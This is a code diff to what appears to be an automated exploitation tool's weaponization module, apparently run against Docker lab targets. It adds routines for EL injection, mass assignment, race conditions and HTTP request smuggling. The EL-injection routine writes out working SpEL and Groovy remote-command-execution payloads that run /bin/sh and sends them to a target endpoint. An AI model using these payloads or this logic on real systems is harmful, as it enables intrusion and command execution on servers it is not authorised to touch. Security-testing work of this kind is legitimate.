@@ -78,6 +78,22 @@ def _infer_vuln_class(res) -> str:
     if any(x in tecnica for x in ("zip-slip", "zip_slip", "archive-extract", "traversal-zip")) or any(
             x in vuln_class for x in ("zip-slip", "zip_slip", "arbitrary-file-write")):
         return "zip_slip"
+    # EL injection (SpEL, Thymeleaf, Jinja2 — escalate to RCE via template)
+    if any(x in tecnica for x in ("el-inject", "spel", "expression-lang", "thymeleaf")) or any(
+            x in vuln_class for x in ("el-injection", "expression-language", "spring-spel")):
+        return "el_injection"
+    # Mass assignment — check if admin fields were accepted
+    if any(x in tecnica for x in ("mass-assign", "over-posting")) or any(
+            x in vuln_class for x in ("mass-assignment", "mass-assign", "parameter-binding")):
+        return "mass_assignment"
+    # Race condition — double-redemption proof
+    if any(x in tecnica for x in ("race-condition", "double-redemption", "toctou")) or any(
+            x in vuln_class for x in ("race-condition", "race-cond")):
+        return "race_condition"
+    # HTTP request smuggling — differential proof
+    if any(x in tecnica for x in ("smuggling", "desync", "cl.te", "te.cl")) or any(
+            x in vuln_class for x in ("http-request-smuggling", "request-smuggling")):
+        return "http_smuggling"
     return ""
 
 
@@ -935,6 +951,98 @@ def _weaponize_zip_slip(boot, res, step_fn) -> dict:
             "error": "zip-slip traversal payloads sent but file write not confirmed in web root"}
 
 
+def _weaponize_el_injection(boot, res, step_fn) -> dict:
+    """EL injection post-exploit: attempt RCE via template expression."""
+    import secrets as _sec
+    ev = res.evidence or {}
+    endpoint = ev.get("endpoint") or "/"
+    inject_param = ev.get("inject_param") or ev.get("ssti_param") or "query"
+    method = (ev.get("metodo") or "POST").upper()
+    # Attempt OS command execution through SpEL/Jinja2 RCE payload
+    _cmd_token = _sec.token_hex(8)
+    _cmd = f"echo {_cmd_token}"
+    _rce_payloads = [
+        f"${{T(java.lang.Runtime).getRuntime().exec(new String[]{{\"/bin/sh\",\"-c\",\"{_cmd}\"}})}}.getText()",
+        f"#{{T(java.lang.ProcessBuilder).new([\"/bin/sh\",\"-c\",\"{_cmd}\"]).start().text}}",
+        f"${{'{_cmd}'.execute().text}}",
+    ]
+    try:
+        import requests as _rq
+        for _pl in _rce_payloads:
+            try:
+                if method == "GET":
+                    r = _rq.get(boot.base_url + endpoint, params={inject_param: _pl}, timeout=10)
+                else:
+                    r = _rq.request(method, boot.base_url + endpoint,
+                                    data={inject_param: _pl}, timeout=10)
+                if _cmd_token in (r.text or ""):
+                    return {
+                        "technique": "el_rce",
+                        "data": {"payload": _pl, "cmd_token": _cmd_token, "response": (r.text or "")[:300]},
+                        "impact": f"EL injection → OS command execution (echo {_cmd_token} confirmed in response)",
+                    }
+            except Exception:
+                continue
+    except Exception:
+        pass
+    return {"technique": "el_injection_confirmed", "data": {}, "impact": "EL expression evaluated (arithmetic proof) — OS command execution not confirmed in this run"}
+
+
+def _weaponize_mass_assignment(boot, res, step_fn) -> dict:
+    """Mass assignment post-exploit: verify admin field was accepted by reading profile."""
+    ev = res.evidence or {}
+    _profile_ep = ev.get("profile_endpoint") or ev.get("get_endpoint") or ""
+    _jwt = ev.get("jwt") or ev.get("token") or ""
+    _admin_signals = ev.get("admin_signals") or []
+    if _jwt and _profile_ep:
+        try:
+            import requests as _rq
+            r = _rq.get(boot.base_url + _profile_ep,
+                        headers={"Authorization": f"Bearer {_jwt}"}, timeout=10)
+            body = r.text or ""
+            _confirmed_signals = [s for s in ("admin", "superAdmin", "is_admin", "is_superuser", "role")
+                                   if f'"{s}"' in body or f"'{s}'" in body]
+            if _confirmed_signals:
+                return {
+                    "technique": "mass_assignment_privilege",
+                    "data": {"profile_body": body[:300], "admin_signals": _confirmed_signals},
+                    "impact": f"Mass assignment: admin fields {_confirmed_signals} confirmed in profile response",
+                }
+        except Exception:
+            pass
+    return {"technique": "mass_assignment_field_accepted", "data": {"admin_signals": _admin_signals},
+            "impact": "Mass assignment: privileged field accepted in registration/update request"}
+
+
+def _weaponize_race_condition(boot, res, step_fn) -> dict:
+    """Race condition: document the double-redemption proof."""
+    ev = res.evidence or {}
+    return {
+        "technique": "race_double_redemption",
+        "data": {
+            "success_count": ev.get("success_count") or ev.get("successful_requests"),
+            "total_requests": ev.get("total_requests"),
+            "winning_response": (ev.get("winning_response") or "")[:200],
+            "double_redemption_key_found": ev.get("double_redemption_key_found"),
+        },
+        "impact": f"Race condition: {ev.get('success_count') or ev.get('successful_requests')} concurrent requests accepted for the same one-time resource",
+    }
+
+
+def _weaponize_http_smuggling(boot, res, step_fn) -> dict:
+    """HTTP request smuggling: document the differential proof."""
+    ev = res.evidence or {}
+    return {
+        "technique": "http_smuggling_differential",
+        "data": {
+            "smug_marker": ev.get("smug_marker") or "",
+            "diff_response": (ev.get("diff_response") or ev.get("response_diff") or "")[:200],
+            "normal_response": (ev.get("normal_response") or "")[:100],
+        },
+        "impact": "HTTP request smuggling: differential response with smuggled marker confirmed — CL.TE or TE.CL desync exploitable",
+    }
+
+
 def run_weaponization(boot, res, step: Optional[Callable] = None) -> dict:
     """
     Extend confirmed trigger to full impact using the live Docker lab session.
@@ -980,6 +1088,14 @@ def run_weaponization(boot, res, step: Optional[Callable] = None) -> dict:
             return _weaponize_nosql(boot, res, step)
         elif vuln_class == "zip_slip":
             return _weaponize_zip_slip(boot, res, step)
+        elif vuln_class == "el_injection":
+            return _weaponize_el_injection(boot, res, step)
+        elif vuln_class == "mass_assignment":
+            return _weaponize_mass_assignment(boot, res, step)
+        elif vuln_class == "race_condition":
+            return _weaponize_race_condition(boot, res, step)
+        elif vuln_class == "http_smuggling":
+            return _weaponize_http_smuggling(boot, res, step)
         else:
             _step(step, f"no weaponization defined for class {vuln_class!r} — skipping")
             return {"technique": "not_applicable", "data": {}, "impact": ""}
